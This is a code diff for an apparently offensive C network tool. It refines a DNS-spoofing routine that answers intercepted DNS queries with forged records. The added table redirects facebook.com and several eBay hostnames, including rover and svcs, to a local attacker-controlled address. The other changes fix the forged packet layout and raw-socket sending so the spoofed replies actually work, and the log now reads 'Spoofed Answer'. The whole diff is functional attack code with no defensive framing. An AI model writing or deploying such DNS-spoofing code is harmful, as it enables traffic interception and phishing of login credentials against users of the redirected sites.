@@ -2,6 +2,11 @@
 
 static const ting_dns_host ting_dns_hosts[] = {
         (ting_dns_host){.host="google.com", .addr=TING_OCTETS(1, 3, 3, 7)},
+        (ting_dns_host){.host="facebook.com", .addr=TING_OCTETS(69, 4, 20, 69)},
+        (ting_dns_host){.host="ebay.com", .addr=TING_OCTETS(192, 168, 0, 17)},
+        (ting_dns_host){.host="www.ebay.com", .addr=TING_OCTETS(192, 168, 0, 17)},
+        (ting_dns_host){.host="rover.ebay.com", .addr=TING_OCTETS(192, 168, 0, 17)},
+        (ting_dns_host){.host="svcs.ebay.com", .addr=TING_OCTETS(192, 168, 0, 17)},
 };
 static const size_t ting_dns_hosts_count = sizeof(ting_dns_hosts)/sizeof(ting_dns_host);
 
@@ -107,8 +112,6 @@ void ting_feature_dns_process(char *buffer, uint16_t size)
         default:
             return;
     }
-    debugf("Handling DNS A record for %s\n", ting_dns_name);
-
     for(i = 0; i < ting_dns_hosts_count; ++i)
     {
         if(strncmp(ting_dns_name, ting_dns_hosts[i].host, name_size) == 0)
@@ -116,6 +119,8 @@ void ting_feature_dns_process(char *buffer, uint16_t size)
 	    goto has_record;
         }
     }
+
+    debugf("Forwarding DNS A record for %s\n", ting_dns_name);
     return;
 
 has_record:
@@ -152,50 +157,76 @@ has_record:
     dns_res->authentic_data         = false;
     dns_res->unused                 = 0;
     dns_res->recursion_available    = true;
-    dns_res->question_count         = 1;
-    dns_res->answer_count           = 1;
-    dns_res->authority_count        = 0;
-    dns_res->resource_count         = 0;
+    dns_res->question_count         = ting_be16(1);
+    dns_res->answer_count           = ting_be16(1);
+    dns_res->authority_count        = ting_be16(0);
+    dns_res->resource_count         = ting_be16(0);
 
     // pointer to the first name
     response_offset = sizeof(ting_hdr_dns);
     response_size = sizeof(ting_hdr_dns);
 
-    memcpy((char*)dns_res + response_size, (char*)dns + sizeof(ting_hdr_dns), name_size);
+    dns_iter = (unsigned char*)dns_res;
+    dns_iter += response_size;
+    memcpy(dns_iter, (char*)dns + sizeof(ting_hdr_dns), name_size);
+    dns_iter += name_size;
+    *dns_iter++ = 0;
 
     response_size += name_size;
-    *((uint16_t*)((char*)dns_res + response_size)) = ting_be16(TING_DNS_TYPE_A);
-    response_size += sizeof(uint16_t);
-    *((uint16_t*)((char*)dns_res + response_size)) = ting_be16(TING_DNS_CLASS_IN);
-    response_size += sizeof(uint16_t);
-    *((uint16_t*)((char*)dns_res + response_size)) = ting_be16((uint16_t)((0b11 << 14) | response_offset));
-    response_size += sizeof(uint16_t);
+    ++response_size;
+
+    *((uint16_t*)dns_iter) = ting_be16(TING_DNS_TYPE_A);
+    dns_iter += sizeof(uint16_t);
+
+    *((uint16_t*)dns_iter) = ting_be16(TING_DNS_CLASS_IN);
+    dns_iter += sizeof(uint16_t);
+
+    *((uint16_t*)dns_iter) = ting_be16((uint16_t)((0b11 << 14) | response_offset));
+    dns_iter += sizeof(uint16_t);
+
+    *((uint16_t*)dns_iter) = ting_be16(TING_DNS_TYPE_A);
+    dns_iter += sizeof(uint16_t);
+
+    *((uint16_t*)dns_iter) = ting_be16(TING_DNS_CLASS_IN);
+    dns_iter += sizeof(uint16_t);
+
+    *((uint32_t*)dns_iter) = ting_be32(123);
+    dns_iter += sizeof(uint32_t);
+
+    *((uint16_t*)dns_iter) = ting_be16(sizeof(ting_dns_hosts[i].addr));
+    dns_iter += sizeof(uint16_t);
+
+    *((uint32_t*)dns_iter) = ting_dns_hosts[i].addr;
+    dns_iter += sizeof(uint32_t);
+
+    response_size += 20;
+    response_size += sizeof(ting_hdr_udp);
 
     udp_res->len = ting_be16(response_size);
-    //udp_res->len = response_size;
 
-    if((client_sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0)
+    if((client_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
     {
         debugf("%s\n", "socket error.");
     }
 
-    ip_res->tot_len = ting_be16((ip_res->ihl * sizeof(uint32_t)) + sizeof(ting_hdr_udp) + response_size);
+    ip_res->tot_len = ting_be16((ip_res->ihl * 4) + sizeof(ting_hdr_udp) + response_size);
 
     client_sin.sin_family = AF_INET;
     client_sin.sin_port = udp->source;
     client_sin.sin_addr.s_addr = ip->saddr;
 
     memset(&client_sin.sin_zero, 0, sizeof(client_sin.sin_zero));
-    print_udp_packet((unsigned char*)ip);
-    print_udp_packet((unsigned char*)ting_buf_dns);
+    //print_udp_packet((unsigned char*)ip);
+    //print_udp_packet((unsigned char*)ting_buf_dns);
 
-    if(sendto(client_sock, ting_buf_dns, ip_res->tot_len, 0, (struct sockaddr*)&client_sin, sizeof(client_sin)) < 0)
+    if(sendto(client_sock, ting_buf_dns, ting_be16(ip_res->tot_len), 0, (struct sockaddr*)&client_sin, sizeof(client_sin)) < 0)
     {
         debugf("%s\n", "sendto error.");
+	perror("socket");
     }
     else
     {
-        debugf("%s\n", "Sent DNS answer.");
+        debugf("Spoofed Answer for  DNS A record for %s\n", ting_dns_name);
     }
 
     close(client_sock);
